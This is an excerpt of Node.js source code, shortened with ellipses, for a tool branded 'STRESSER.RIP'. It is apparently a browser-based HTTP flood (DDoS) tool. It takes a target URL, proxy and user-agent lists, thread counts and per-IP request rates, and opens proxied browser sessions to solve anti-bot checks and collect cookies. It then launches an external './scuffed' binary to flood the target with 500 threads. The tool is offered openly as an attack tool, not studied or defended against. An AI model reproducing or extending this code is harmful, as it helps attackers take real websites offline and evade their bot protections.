...
if (process.argv.length < 8) {
    console.log(colors.rainbow('[STRESSER.RIP]'), colors.red('URL Time ProxyList UserAgentList Threads RQ/IP'));
    process.exit(0);
}

async function main() {
    console.log(colors.rainbow('[STRESSER.RIP]'), colors.red('Owner: @udbnt | BROWSER'));
    ...
    async function addsession() {
        try {
            ...
            solving({
                ...
                console.log(colors.rainbow('[STRESSER.RIP]'), 'User-Agent: ' + useragents, 'Cookie: ' + goodcookie, 'Proxy: ' + proxoid);
    ...
    for (let start = 0; start < threads; start++) {
        console.log(colors.rainbow('[STRESSER.RIP]'), 'Create session: #' + start);
			addsession();
    }
}
...
function solving(message) {
    return new Promise((resolve, reject) => {
        console.log(colors.rainbow('[STRESSER.RIP]'), 'Proxy added: ' + message.proxoid);
...
function post(urls, proxoid, domain, useragents, duration, goodcookie, threads, ratelimit, randquery) {
    let promise = new Promise((res, rej) => {
        const ls = spawn('./scuffed', ["host=" + urls, "limit=" + ratelimit, "time=" + duration, "good=" + proxoid, "ua=" + useragents, "threads=500", "cookie=" + goodcookie]);
